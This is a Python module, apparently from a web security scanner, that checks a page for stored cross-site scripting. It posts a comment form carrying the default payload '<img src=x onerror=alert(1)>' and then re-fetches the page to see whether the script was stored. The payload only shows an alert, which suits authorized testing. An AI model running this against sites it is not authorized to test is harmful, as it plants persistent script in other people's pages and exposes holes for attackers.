# modules/new_core/verify_stored_xss.py
from typing import Optional, Any
from bs4 import BeautifulSoup
import time
from termcolor import cprint

def verify_stored(page_url: str, 
                  author_field: str = "author",
                  comment_field: str = "comment",
                  author_value: str = "attacker",
                  comment_value: str = "<img src=x onerror=alert(1)>",
                  session: Any = None,
                  delay: float = 1.5,
                  verbose: bool = False) -> dict:
    """
    Advanced verification for Stored XSS. 
    Checks if a payload is persisted in the database and reflected in the UI.
    """
    
    result = {
        "posted": False,
        "post_status": None,
        "get_status": None,
        "found_in_body": False,
        "found_in_comment_nodes": False,
        "details": {}
    }

    if session is None:
        import requests
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Stored-Verifier)'})

    try:
        # Step 1: Initial GET to establish session/cookies
        if delay > 0: time.sleep(delay)
        r0 = session.get(page_url, timeout=10)
        if verbose:
            cprint(f"[*] Initial GET {page_url} -> {r0.status_code}", "blue")
            
        # Step 2: POST the payload (simulating a comment/form submission)
        if delay > 0: time.sleep(delay)
        post_data = { author_field: author_value, comment_field: comment_value }
        r_post = session.post(page_url, data=post_data, timeout=10)
        
        result["post_status"] = getattr(r_post, "status_code", None)
        result["posted"] = (r_post.status_code < 400)
        
        if verbose:
            cprint(f"[*] POST status: {r_post.status_code}", "blue")

        # Step 3: GET the page again to see if the payload is stored
        if delay > 0: time.sleep(delay)
        r_get = session.get(page_url, timeout=10)
        result["get_status"] = getattr(r_get, "status_code", None)
        
        body = r_get.text or ""
        result["found_in_body"] = comment_value in body
        
        if verbose:
            cprint(f"[*] Checking storage... Found in body: {result['found_in_body']}", "magenta")

        # Step 4: Parse HTML to find exactly where it was stored
        soup = BeautifulSoup(body, "html.parser")
        tags_to_check = ["div", "li", "pre", "p", "span", "article", "section"]
        candidate_content = "\n".join([str(n) for n in soup.find_all(tags_to_check)])
        
        result["found_in_comment_nodes"] = comment_value in candidate_content
        
        if result["found_in_body"]:
            idx = body.find(comment_value)
            start = max(0, idx - 60)
            end = idx + len(comment_value) + 60
            result["details"]["snippet"] = body[start:end].strip()
            if verbose:
                cprint(f"[!] Stored XSS Snippet Found: {result['details']['snippet']}", "red", attrs=['bold'])

    except Exception as e:
        result["details"]["error"] = str(e)
        if verbose:
            cprint(f"[X] Execution error: {e}", "red")

    return result
